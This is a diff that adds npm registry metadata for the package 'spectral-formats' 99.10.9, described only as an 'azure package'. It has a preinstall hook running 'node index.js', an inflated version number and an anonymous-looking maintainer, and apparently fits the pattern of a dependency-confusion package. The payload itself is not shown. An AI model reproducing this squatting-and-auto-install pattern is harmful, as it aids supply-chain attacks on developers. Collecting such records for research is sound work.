@@ -1,0 +1,62 @@
+{
+    "_id": "spectral-formats",
+    "name": "spectral-formats",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "spectral-formats",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "spectral-formats@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-dtH8b6cDFdOmSX0EWaVBY/jpXnh/eaK513rNaDJT+vqbgcrAd8/Ia/9j05dzQe6Oh0wARo2lyybaWhPlb2qKwA==",
+                "shasum": "67952481acc3e4e54966e01e14727fcb44a4fe12",
+                "tarball": "https://registry.npmjs.org/spectral-formats/-/spectral-formats-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5068,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO8DxACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqsEhAAhm1BTBycFL8uepmu9xUz5pD2nqqaObEYFVlfbAwPWkIrb4cv\r\nVYmYj61BIuR+JHb2I/N8koHnz8kp7nkyf8MERvEdWm3+OL7G3taBjd4csa07\r\njAFdDmZe6cWe6nPYBOFAFp6+rgyLPZD6T0TC2QQUeGyARxi5AhQKYixbZLa1\r\nMl2KOhPaZPJqFzkEb/jm3RxQEXzRPOqE9KtcLV162rJCEUrwUbyHERe6S/ol\r\n48NGTAaST2fRae4Mt5j81ySX0VC1b3GWzRaCVYIsMfpZnAOlVe+8e3Kxw4yd\r\n1f6LifHioiGlFK5bFcgFxlos0dQDjRhSE9yfeC0G6VekCbYEiu6N7nsxRXmi\r\n6hYGMrBS/ccmH3IGYQMshlfDbePLbUWnZ0A/wp9Z9XCdoPZobzha992GmLdw\r\na/vJu0U9gc/vhmLM6Iw/fbHgfyKtd+cGyVjbPHzNPIUMC1JC1bu/Qn0sb66Q\r\nuX0yxVT9tpg3w1UfsoyJnoN8dK0fcovAZ8/vv5VrG4Z4JSnHKJ0KPa91EzUb\r\nMyHnCUZ2PjccLSlRitHwgBObk0yaQcrNA1COFoNUKTxVcJhwUe1rpfzYrNJl\r\nALNnXHPH9N3N1yak4XAEdibYyCpeHsbO6MFiUjH50ebCvRGJJ2xjz8F/X7Ei\r\nTyp6Sskj4Cue6/PVZW+4RCDfKQg5dmHV8Ok=\r\n=+gnS\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "ugr5c8z8",
+                "email": "ugr5c8z8@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "ugr5c8z8",
+                    "email": "ugr5c8z8@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/spectral-formats_99.10.9_1648083185478_0.7667283122951856"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T00:53:05.477Z",
+        "99.10.9": "2022-03-24T00:53:05.621Z",
+        "modified": "2022-03-24T00:53:05.789Z"
+    },
+    "maintainers": [
+        {
+            "name": "ugr5c8z8",
+            "email": "ugr5c8z8@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
